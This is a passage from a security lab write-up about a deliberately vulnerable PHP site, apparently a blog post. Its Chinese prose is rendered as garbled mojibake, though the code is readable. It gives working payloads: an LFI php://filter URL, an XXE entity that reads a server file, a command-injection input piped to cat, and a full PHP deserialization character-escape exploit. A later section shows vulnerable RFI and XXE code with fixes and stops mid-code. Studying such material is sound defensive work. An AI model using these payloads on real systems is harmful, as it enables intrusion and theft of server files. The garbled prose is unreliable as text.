id="12-unserialize"><a href="#12-unserialize" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>è¯¥æ¼æ´å°±æ˜¯ä¸€ä¸ªCTFé¢˜ç›®ï¼Œä½†æ˜¯æºç éœ€è¦åˆ©ç”¨å‰é¢çš„æ¼æ´è·å–</p><p>é“¾æ¥:<a href="http://192.168.164.147/ctf/index">http://192.168.164.147/ctf/index</a></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164427572.png" alt="image-20210323164427572" style="zoom:67%;"><p>æ ¹æ®æç¤ºæ˜¯ä¸€ä¸ªctfé¢˜ç›®ï¼Œé‚£ä¹ˆåº”è¯¥ä¹Ÿç¬¦åˆä¸€èˆ¬ctfä¸­webé¢˜ç›®çš„å¥—è·¯ã€‚</p><p>é¦–å…ˆæŸ¥çœ‹æºç  ï¼Œè·å–æç¤º</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164641331.png" alt="image-20210323164641331"></p><p>ä½†æ˜¯ä¸€èˆ¬çš„ååºåˆ—åŒ–æ¼æ´çš„é¢˜ç›®éƒ½æ˜¯æœ‰æºç çš„ï¼Œåªæœ‰æ ¹æ®æºç æ‰èƒ½å†™å‡ºEXPã€‚</p><p>æ—¢ç„¶æ²¡æœ‰æºç ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¹‹å‰å‘ç°çš„æ¼æ´è·å–æºç ã€‚</p><p>æœ‰äº”ç§è·å–æºç çš„æ–¹æ³•</p><ul><li><p>æ–‡ä»¶ä¸Šä¼ </p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åï¼Œå¯ä»¥æ§åˆ¶æœåŠ¡å™¨ï¼Œå¯ä»¥ç›´æ¥åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸­ä¸‹è½½æ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171248434.png" alt="image-20210323171248434"></p></li><li><p>LFI</p><p>ä½¿ç”¨<code>php://filter</code>ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ¼æ´çš„ä½ç½®è·å–base64æºç </p><p>payloadï¼š</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/contact/i</span>ndex?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=unserialize.php</code></pre></li></ul><p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171514268.png" alt="image-20210323171514268"></p><ul><li><p>XXE</p><p>åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ è·å–çš„è·¯åŠ²</p><p>payload</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///var/www/public/unserialize.php&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>das<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></li><li><p>ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>ç‚¹å‡»å³å¯ä¸‹è½½åˆ°æ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414195346355.png" alt="image-20210414195346355"></p></li><li><p>RCE</p><p>é¦–å…ˆ åˆ—å‡ºç›®å½•</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | ls</code></pre><p>è¯»å–æ–‡ä»¶</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | cat unserialize.php</code></pre></li></ul><p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171610197.png" alt="image-20210323171610197"></p><p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171742181.png" alt="image-20210323171742181"></p><p>  æºç å¦‚ä¸‹</p>  <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ç»§ç»­åŠ æ²¹&#x27;)&lt;/script&gt;&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);&#125;<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<span class="hljs-variable">$test</span>=unserialize(<span class="hljs-variable">$ser</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>å¼€å§‹è§£é¢˜</p><p><strong>è€ƒå¯Ÿç‚¹æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</strong></p><p>å…ˆä»ç®€å•çš„PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸äº†è§£ä»€ä¹ˆæ˜¯ååºåŒ–é€ƒé€¸ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;&#125;<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<span class="hljs-meta">?&gt;</span></code></pre><p>åˆ©ç”¨ååºåˆ—åŒ–é€ƒé€¸ä¿®æ”¹passçš„å€¼ã€‚</p><p>æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœ</p><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre><p><code>s:4:&quot;aaaa&quot;</code>såé¢çš„æ•°å­—è¡¨ç¤ºå˜é‡çš„é•¿åº¦ï¼Œphpæ‰§è¡Œçš„æ—¶å€™ä¼šæ ¹æ®å…¶é•¿åº¦è¯»å–æ•°æ®ï¼Œå¦‚æœä¸ç¬¦åˆè§„åˆ™åˆ™ä¼šååºåˆ—åŒ–å¤±è´¥ã€‚</p><p>ä¾‹å¦‚</p><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre><p>å°†4æ”¹ä¸º5ï¼Œé‚£ä¹ˆåˆ™è®¤ä¸ºnameçš„å€¼ä¸º <code>aaaa&quot;</code>,æ­¤æ—¶å› ä¸ºå‰é¢çš„â€æ— æ³•é—­åˆè€Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/Ctefk8iKXP34Gmn.png" alt="error.png"></p><p>è€Œä¸Šé¢çš„ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªæ›¿æ¢å‡½æ•°ï¼Œåªè¦nameä¸­å­˜åœ¨bbåˆ™å°†å…¶æ›¿æ¢ä¸ºcccï¼Œå¯¼è‡´nameå­—æ®µçš„é•¿åº¦ä¼šå¢åŠ 1ï¼Œæˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æ„é€ å‡ºæƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p><p>ä¾‹å¦‚æƒ³å°†passå˜é‡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹</p><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre><p>å…¶ä¸­ å‰é¢çš„ â€œ;æ˜¯ä¸ºäº†é—­åˆçš„å˜é‡çš„â€ï¼Œä¿è¯è¯­æ³•æ­£ç¡®ï¼Œ}çš„ä½œç”¨æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿—</p><p>ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º27ï¼Œæ‰€ä»¥å°±éœ€è¦27ä¸ªbbæ¥äº§ç”Ÿ27ä¸ªå­—ç¬¦é•¿åº¦çš„é€ƒé€¸</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;&#125;<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();var_dump(serialize(<span class="hljs-variable">$AA</span>));<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));var_dump(<span class="hljs-variable">$res</span>);<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<span class="hljs-comment">//echo unserialize($AA);</span><span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//ç»“æœå¦‚ä¸‹   ||ä¸ºå¯¹é½</span><span class="hljs-comment">/*</span><span class="hljs-comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||</span><span class="hljs-comment">string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span><span class="hljs-comment">hacker</span><span class="hljs-comment">*/</span></code></pre><p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" alt="success.png"></p><p>è¿™é‡Œpassçš„å€¼å°±è¢«è¯¥ç§°äº†hacker</p><p>æ€»ç»“ï¼š<strong>é€ƒé€¸æˆ–è€…è¯´è¢«â€œé¡¶â€å‡ºæ¥çš„payloadå°±ä¼šè¢«å½“åšå½“å‰ç±»çš„å±æ€§è¢«æ‰§è¡Œã€‚</strong></p><p>è€Œé’ˆå¯¹è¿™é“é¢˜ï¼Œä»£ç çš„æ„æ€å¤§è‡´ä¸ºï¼ŒPOSTæäº¤ä¸€ä¸ªuanmeï¼Œpasswordé»˜è®¤ä¸º1ï¼Œä¹‹åç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¹¶å°†å­—ç¬¦ä¸²ä¸­çš„challengeæ¢æˆeasychallengeï¼Œå­—ç¬¦é•¿åº¦å¢åŠ 4ï¼Œå½“å¯†ç ä¸ºeasyæ—¶ï¼Œå¾—åˆ°flagã€‚è¿™é¢˜çœ‹ä¸Šå»ä¸ä¸Šé¢çš„ä¾‹å­å·®ä¸å¤šï¼Œä½†æ˜¯æ„é€ çš„æ—¶å€™å‘ç°å¹¶ä¸æ˜¯</p><p>éœ€è¦æ„é€ çš„å±æ€§</p><pre><code class="hljs vim"><span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;;s:4:&quot;</span>password<span class="hljs-string">&quot;;s:4:&quot;</span>easy<span class="hljs-comment">&quot;;&#125;) =29</span></code></pre><p>å¯ä»¥å‘ç°ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º29ï¼Œè€Œæ¯æ›¿æ¢ä¸€ä¸ªchallengeåªèƒ½é€ƒé€¸å‡º4ä¸ªå­—ç¬¦ï¼Œä¸èƒ½æ„é€ å‡º29ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å†æ„é€ å‡ºä¸€ä¸ªå±æ€§ï¼Œä½¿ä¸Šé¢çš„å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º4çš„å€æ•°ã€‚</p><pre><code class="hljs css">&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre><p>ä¸Šé¢æ„é€ å‡ºçš„payloadé•¿åº¦ä¸º48å› æ­¤è¿˜éœ€è¦12ä¸ªchallengeã€‚</p><p><strong>expå¦‚ä¸‹</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;1&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);&#125;<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºçš„ç»“æœï¼š</p><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  é•¿åº¦ä¸º156</span></code></pre><p><strong>finalpayload</strong>ï¼š</p><pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre><p>æäº¤payloadï¼Œè·å–flag</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323194642093.png" alt="image-20210323194642093"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><h2 id="1-RFI-1"><a href="#1-RFI-1" class="headerlink" title="1.RFI"></a>1.RFI</h2><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>ä»£ç ä½ç½®<code>application\employee\controller\Index.php</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;            <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;        &#125;<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;    <span class="hljs-variable">$info</span> = [];    <span class="hljs-variable">$info</span> = <span class="hljs-variable">$info_1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;info&#x27;</span> =&gt; <span class="hljs-variable">$info</span>]);    <span class="hljs-keyword">return</span> view();    &#125;</code></pre><p>è¿™ä¸ªä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯åŒ…å«äº†<code>info.php</code>æ–‡ä»¶æŒ‰ï¼Œå¹¶è·å–å…¶ä¸­çš„$infoå‚æ•°ï¼Œç„¶åå‘é€ç»™å‰ç«¯ï¼Œç„¶ååœ¨å‰ç«¯æ˜¾ç¤ºå†…å®¹ã€‚ä½†æ˜¯ä¹Ÿå¾ˆå±é™©ï¼Œå› ä¸ºæœ‰includeå‡½æ•°çš„å­˜åœ¨ï¼Œæ‰€ä»¥å­˜åœ¨RFIï¼Œè€Œä¸”å¯¹æäº¤çš„å‚æ•°æ²¡æœ‰ä»»ä½•çš„æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨</p><h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ul><li><p><strong>æ–¹æ³•ä¸€</strong></p><p>ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­æ·»åŠ </p><pre><code class="hljs ini"><span class="hljs-attr">allow_url_open</span> = <span class="hljs-literal">off</span><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">off</span></code></pre><p>æ„æˆRFIæ¼æ´çš„æ¡ä»¶ååˆ†è‹›åˆ»ï¼Œåªæœ‰php.iniä¸­ä¸Šé¢ä¸¤ä¸ªé…ç½®é¡¹éƒ½æ²¡offæ‰èƒ½åˆ©ç”¨è¯¥æ¼æ´ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142620521.png" alt="image-20210420142620521" style="zoom: 67%;"></li><li><p><strong>æ–¹æ³•äºŒ</strong></p><p>åœ¨ä»£ç ä¸­é™åˆ¶æäº¤ä¸Šçš„æ–‡ä»¶åï¼Œå› ä¸ºåªéœ€è¦åŒ…å«<code>about.php</code>ï¼Œæ‰€ä»¥æ£€æŸ¥æäº¤ä¸Š<code>$file</code>æ˜¯å¦ä¸º<code>about.php</code></p><pre><code class="hljs php"><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;          <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;      &#125;      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;info.php&quot;</span>)&#123;          <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;æ–‡ä»¶åé”™è¯¯ï¼&quot;</span>)      &#125;      <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;</code></pre></li></ul><h2 id="2-XXE-1"><a href="#2-XXE-1" class="headerlink" title="2.XXE"></a>2.XXE</h2><h3 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>ä»£ç ä½ç½®<code>application\advice\controller\Index.php</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;        <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>;        libxml_disable_entity_loader(<span class="hljs-literal">false</span>);        <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xmlfile</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;            <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();            <span class="hljs-comment">// var_dump($dom);</span>            <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);            <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);            <span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;            <span class="hljs-variable">$info</span> = <span class="hljs-variable">$creds</span>-&gt;info;            <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;yzncms&quot;</span>);            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());            &#125;            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO yzn_new (name, info) values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$info</span>&#x27;)&quot;</span>;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>))&#123;                <span class="hljs-variable">$code</span> = <span class="hljs-number">1</span>;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;æäº¤æˆåŠŸï¼&#x27;)&lt;/script&gt;&quot;</span>;                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);            &#125;        &#125;</code></pre><p>å‰ç«¯ä»£ç </p><pre><code class="hljs html">var data = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&quot; + username + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>&quot; + info + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>&quot;;            $.ajax(&#123;                type: &quot;POST&quot;,                url: &quot;/advice/index&quot;,                contentType: &quot;application/xml;charset=utf-8&quot;,                data: data,                dataType: &quot;xml&quot;,                anysc: false,                success: function (result) &#123;                    var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;                    if(code === &quot;0&quot;)&#123;                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;);                    &#125;else &#123;                        